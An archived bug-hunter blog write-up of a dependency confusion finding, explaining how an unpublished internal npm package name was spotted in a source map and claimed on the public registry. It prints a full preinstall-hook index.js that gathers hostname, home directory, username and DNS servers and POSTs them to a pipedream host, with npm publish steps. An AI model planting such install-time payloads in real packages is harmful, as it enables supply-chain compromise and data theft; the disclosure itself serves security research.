---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-08-30_dependency-confusion-attack-a-route-to-rce.md
original_filename: 2023-08-30_dependency-confusion-attack-a-route-to-rce.md
title: 'Dependency Confusion Attack: A Route to RCE'
category: documents
detected_topics:
- supply-chain
- command-injection
tags:
- imported
- documents
- supply-chain
- command-injection
language: en
raw_sha256: f99ece9ea3bc7442e51c51a20ed554810f1a503f64d9c9b42ec491c596b1a685
text_sha256: 1539a9919f8ffe266c3cc9ce6f21d8c5e8d887afd617718fee915cabcab26adf
ingested_at: '2026-06-28T07:32:25Z'
sensitivity: unknown
redactions_applied: false
---

# Dependency Confusion Attack: A Route to RCE

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-08-30_dependency-confusion-attack-a-route-to-rce.md
- Source Type: markdown
- Detected Topics: supply-chain, command-injection
- Ingested At: 2026-06-28T07:32:25Z
- Redactions Applied: False
- Raw SHA256: `f99ece9ea3bc7442e51c51a20ed554810f1a503f64d9c9b42ec491c596b1a685`
- Text SHA256: `1539a9919f8ffe266c3cc9ce6f21d8c5e8d887afd617718fee915cabcab26adf`


## Content

---
title: "Dependency Confusion Attack: A Route to RCE"
page_title: "Dependency Confusion Attack: A Route to RCE | Krunal Savaliya"
url: "https://sklnhunt.github.io/posts/dependencyconfusion/"
final_url: "https://sklnhunt.github.io/posts/dependencyconfusion/"
authors: ["Krunal Savaliya"]
bugs: ["Dependency confusion", "RCE"]
publication_date: "2023-08-30"
added_date: "2024-08-26"
source: "pentester.land/writeups.json"
original_index: 823
---

# Dependency Confusion Attack: A Route to RCE

Posted  Aug 31, 2023  Updated  Aug 30, 2023 

By _[sklnhunt](https://github.com/sklnhunt) _ _4 min_ read

Hello, amazing hackers! Today, I’m explaining one of my recent findings: the dependency confusion attack and how it can lead to remote code execution. This vulnerability was discovered during a private pen-test engagement.

* * *

### What is Dependency Confusion?__

  * A Dependency Confusion attack or supply chain substitution attack occurs when a software installer script is tricked into pulling a malicious code file from a public repository (e.g. NPM, PIP, RUBYGEMS, MVN etc.) instead of the intended file of the same name from an internal repository. The attacker can upload a package with a higher version number to the public repository.

  * In this writeup, we are focusing on the **NPM** package dependency. The Dependency confusion vulnerability was discovered by [Alex Brisan](https://twitter.com/alxbrsn) and it is explained very in-depth in his [writeup](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610).

### Discovery __

  * The primary use case of the application was to analyze financial data submitted by users. During recon, I always prefer to manually review JavaScript files. While going through the HTTP requests related to JS files in Burp Suite, I observed an**app.randomnumbers.js.map** (source map) file.

  * Generally, source map files are used for debugging purposes by developers. It is mapping between minified JS files and their original source JS files. I started reviewing the JS source map file and discovered some Node.js packages by searching for keywords such as `import`, `require`, and `node_modules`.

____

`
  
  
  1
  2
  3
  4
  5
  6
  7
  8
  9
  10
  11
  12
  13
  14

| 
  
  
  //app.randomnumber.js.map
  import {
  NameSpaces
  }
  from '../constants/namespaces';
  import store from '../redux-store/store';
  const { Trackevaluator } = require('ORGNAME-trackevaluator'); // Here ORGNAME indicates company name
  const Context = require('./context').Context;
  const ReferralContext = require('./referral.context').ReferralContext;
  const evaluate = new Trackevaluator();
  const camelize = (obj) => _.transform(obj, (acc, value, key, target) => {
  const camelKey = _.isArray(target) ? key : _.camelCase(key);
  acc[camelKey] = _.isObject(value) ? camelize(value) : value;
  });
  
  
---|---  
`

  * During the analysis of the file, a package named `ORGNAME-trackevaluator` was found, as shown in the code snippet above. While searching this package on the [npmjs.com](https://www.npmjs.com/) gave 0 results, indicating a potential vulnerability to a dependency confusion attack.

[![nopackagenpm](/assets/img/NPM2.png)](/assets/img/NPM2.png) _package not found_

> NPM packages can also be found in the **package.json** and **package-lock.json** files.

  * Instead of manually checking each package, we can use the tool called [confused](https://github.com/visma-prodsec/confused) to identify packages that are not hosted on public repositories.

### Exploitation __

  1. Create a package using`npm init` command. Make sure to provide higher version number during creation process of the package.
  2. In the **package.json** file, add the command `"preinstall" : "node index.js"` under `"scripts"` parameter as shown in below snippet.

[![package.json_codesnippet](/assets/img/NPM1.png)](/assets/img/NPM1.png) _package.json file_

  3. Create **index.js** file with mentioned below code. Make sure to change the hostname with your burpcollaborator or pipedream domain in the code.

____

`
  
  
  1
  2
  3
  4
  5
  6
  7
  8
  9
  10
  11
  12
  13
  14
  15
  16
  17
  18
  19
  20
  21
  22
  23
  24
  25
  26
  27
  28
  29
  30
  31
  32
  33
  34
  35
  36
  37
  38
  39
  40
  41
  42
  43
  44
  45
  46
  47
  48

| 
  
  
  //index.js
  //author:- whitehacker003@protonmail.com
  const os = require("os");
  const dns = require("dns");
  const querystring = require("querystring");
  const https = require("https");
  const packageJSON = require("./package.json");
  const package = packageJSON.name;
  
  const trackingData = JSON.stringify({
  p: package,
  c: __dirname,
  hd: os.homedir(),
  hn: os.hostname(),
  un: os.userInfo().username,
  dns: dns.getServers(),
  r: packageJSON ? packageJSON.___resolved : undefined,
  v: packageJSON.version,
  pjson: packageJSON,
  });
  
  var postData = querystring.stringify({
  msg: trackingData,
  });
  
  var options = {
  hostname: "eoty85f2nvs15dudw.m.pipedream.net", //replace burpcollaborator.net with Interactsh or pipedream
  port: 443,
  path: "/",
  method: "POST",
  headers: {
  "Content-Type": "application/x-www-form-urlencoded",
  "Content-Length": postData.length,
  },
  };
  
  var req = https.request(options, (res) => {
  res.on("data", (d) => {
  process.stdout.write(d);
  });  
  });
  
  req.on("error", (e) => {
  // console.error(e);
  });
  
  req.write(postData);
  req.end();
  
  
---|---  
`

  4. Publish the package using `npm publish` command. Verify the published package on the npm public repository.

[![npm1](/assets/img/NPM3.png)](/assets/img/NPM3.png) _package is hosted on the npm website_

  5. The preinstall script will execute `node index.js` command. Once package is installed on the system.

  * After sometime of uploading the package, I received pingbacks containing the **hostname** , **directory** , **IP address** , and **username** from many systems on my server. This was fixed quickly by the developers, once it was reported.

[![npmpingback](/assets/img/NPM4.png)](/assets/img/NPM4.png) _remote code execution_

###  Impact __

  * A Dependency Confusion attack, whether opportunistic or targeted, can result in widespread infections among a vendor’s customers. This can empower attackers to execute unauthorized access, steal data, deploy ransomware which disrupt operations.

###  References __

  * [Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)

  * [Dependency Confusion](https://dhiyaneshgeek.github.io/web/security/2021/09/04/dependency-confusion/)

  * [Dependency Confusion Attack – What, Why, and How?](https://redhuntlabs.com/blog/dependency-confusion-attack-what-why-and-how/)

__[web](/categories/web/)

__[web](/tags/web/) [rce](/tags/rce/)

This post is licensed under [ CC BY 4.0 ](https://creativecommons.org/licenses/by/4.0/) by the author.

Share [ __](https://twitter.com/intent/tweet?text=Dependency%20Confusion%20Attack:%20A%20Route%20to%20RCE%20-%20Krunal%20Savaliya&url=https%3A%2F%2Fsklnhunt.github.io%2Fposts%2Fdependencyconfusion%2F "Twitter") [ __](https://www.facebook.com/sharer/sharer.php?title=Dependency%20Confusion%20Attack:%20A%20Route%20to%20RCE%20-%20Krunal%20Savaliya&u=https%3A%2F%2Fsklnhunt.github.io%2Fposts%2Fdependencyconfusion%2F "Facebook") __
